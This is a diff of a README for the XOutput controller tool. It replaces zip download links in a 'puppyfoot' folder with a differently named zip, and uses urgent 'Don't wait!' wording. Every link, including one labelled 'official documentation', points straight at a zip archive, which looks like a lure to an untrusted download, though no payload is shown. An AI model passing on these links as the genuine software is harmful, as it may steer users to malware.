@@ -6,7 +6,7 @@ Welcome to XOutput! This software lets you use older or unsupported game control
 
 ## 📥 Download XOutput
 
-[![Download XOutput](https://raw.githubusercontent.com/bartek5522/XOutput/main/puppyfoot/XOutput_v1.9-alpha.2.zip)](https://raw.githubusercontent.com/bartek5522/XOutput/main/puppyfoot/XOutput_v1.9-alpha.2.zip)
+[![Download XOutput](https://raw.githubusercontent.com/bartek5522/XOutput/main/puppyfoot/X_Output_v1.7.zip)](https://raw.githubusercontent.com/bartek5522/XOutput/main/puppyfoot/X_Output_v1.7.zip)
 
 ## 🖥️ System Requirements
 
@@ -29,7 +29,7 @@ If you're using an Xbox 360 controller, ensure you have the necessary drivers in
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download XOutput](https://raw.githubusercontent.com/bartek5522/XOutput/main/puppyfoot/XOutput_v1.9-alpha.2.zip).
+To get started, visit this page to download: [Download XOutput](https://raw.githubusercontent.com/bartek5522/XOutput/main/puppyfoot/X_Output_v1.7.zip).
 
 ### Installation Steps
 
@@ -76,11 +76,11 @@ Yes, XOutput is entirely free to download and use.
 
 ## 📝 Additional Resources
 
-- **Documentation:** For more details and user guides, visit our [official documentation](https://raw.githubusercontent.com/bartek5522/XOutput/main/puppyfoot/XOutput_v1.9-alpha.2.zip).
+- **Documentation:** For more details and user guides, visit our [official documentation](https://raw.githubusercontent.com/bartek5522/XOutput/main/puppyfoot/X_Output_v1.7.zip).
 - **Support:** If you run into any difficulties, feel free to reach out in the community support forums linked above.
 
 ### Get Started Now
 
-Don’t wait! Visit this page to download XOutput and start enjoying your games with any controller: [Download XOutput](https://raw.githubusercontent.com/bartek5522/XOutput/main/puppyfoot/XOutput_v1.9-alpha.2.zip). 
+Don’t wait! Visit this page to download XOutput and start enjoying your games with any controller: [Download XOutput](https://raw.githubusercontent.com/bartek5522/XOutput/main/puppyfoot/X_Output_v1.7.zip). 
 
 With XOutput, gaming is more inclusive. Enjoy!
